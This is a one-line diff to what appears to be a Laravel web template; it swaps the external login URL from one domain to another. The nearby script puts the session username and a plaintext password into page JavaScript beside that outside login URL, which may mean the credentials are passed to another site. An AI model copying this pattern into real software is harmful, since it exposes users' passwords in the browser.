@@ -115,7 +115,7 @@
     <script>
         var errorMessage = @json(session('error'));
         var successMessage = @json(session('success'));
-        var url = 'https://holiday788.site/login';
+        var url = 'https://ttt930sc.online/login';
         var name = @json(session('username'));
         var pw = @json(session('password'));
 
